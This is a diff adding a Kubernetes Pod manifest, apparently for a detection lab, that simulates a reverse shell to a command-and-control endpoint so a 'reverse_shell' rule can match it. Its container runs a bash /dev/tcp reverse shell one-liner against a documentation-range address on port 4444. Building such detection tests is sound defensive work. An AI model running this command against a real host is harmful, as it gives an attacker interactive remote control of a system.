@@ -1,0 +1,42 @@
+# Scenario 2: reverse shell to a C2 endpoint.
+#
+# Technique: T1071. Rule: reverse_shell.
+#
+# SIMULATION: the C2 address is in the RFC 5737 documentation range and the
+# victim namespace denies egress, so the connection cannot be established. The
+# execve carrying "/dev/tcp/..." is what the rule matches, and the address and
+# port remain in the shell's memory for the capture to recover - which is the
+# indicator an analyst actually needs.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell
+  namespace: victim
+  labels:
+    app.kubernetes.io/part-of: flight-recorder-lab
+    scenario: reverse-shell
+  annotations:
+    flight-recorder.io/scenario: "T1071 reverse shell establishment"
+spec:
+  restartPolicy: Never
+  terminationGracePeriodSeconds: 0
+  containers:
+    - name: shell
+      image: bash:5.2
+      command: ["/bin/bash", "-c"]
+      args:
+        - |
+          C2_HOST="203.0.113.66"
+          C2_PORT="4444"
+          echo "simulating: bash -i >& /dev/tcp/$C2_HOST/$C2_PORT 0>&1"
+          timeout 3 bash -c "bash -i >& /dev/tcp/${C2_HOST}/${C2_PORT} 0>&1" || true
+          sleep 5
+      securityContext:
+        allowPrivilegeEscalation: false
+        runAsNonRoot: true
+        runAsUser: 1000
+        capabilities:
+          drop: ["ALL"]
+      resources:
+        requests: { cpu: 10m, memory: 32Mi }
+        limits: { cpu: 200m, memory: 128Mi }
